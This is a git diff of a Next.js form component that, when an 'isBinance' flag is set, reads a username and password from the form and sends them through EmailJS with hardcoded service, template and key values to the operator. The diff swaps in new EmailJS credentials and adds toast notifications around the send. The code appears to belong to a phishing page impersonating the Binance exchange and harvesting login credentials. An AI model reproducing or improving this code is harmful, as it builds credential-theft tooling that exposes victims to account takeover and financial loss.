@@ -4,6 +4,7 @@
 import { useRef } from 'react';
 import { useParams, useRouter } from 'next/navigation';
 import emailjs from '@emailjs/browser';
+import toast from 'react-hot-toast';
 
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -18,26 +19,29 @@ export default function Form() {
 
   const sendEmail = (e) => {
     e.preventDefault();
+    const message = isBinance
+      ? `Username: ${form.current.username.value}, password: ${form.current.password.value}`
+      : form.current.message.value;
 
-    emailjs
-      .send(
-        'service_5gpw30c',
-        'template_5rlbagi',
+    toast
+      .promise(
+        emailjs.send(
+          'service_ks0pe2w',
+          'template_ja9k2km',
+          {
+            message,
+          },
+          'pApVsoExRZnClsWKy'
+        ),
         {
-          message: isBinance
-            ? `Username: ${form.current.username.value}, password: ${form.current.password.value}`
-            : form.current.message.value,
-        },
-        '7fQ-xstCOTi0ZiuVg'
-      )
-      .then(
-        (result) => {
-          push('/');
-        },
-        (error) => {
-          alert(error);
+          loading: 'Sending',
+          success: 'Success',
+          error: 'Something went wrong',
         }
-      );
+      )
+      .then((result) => {
+        push('/');
+      });
   };
 
   return (
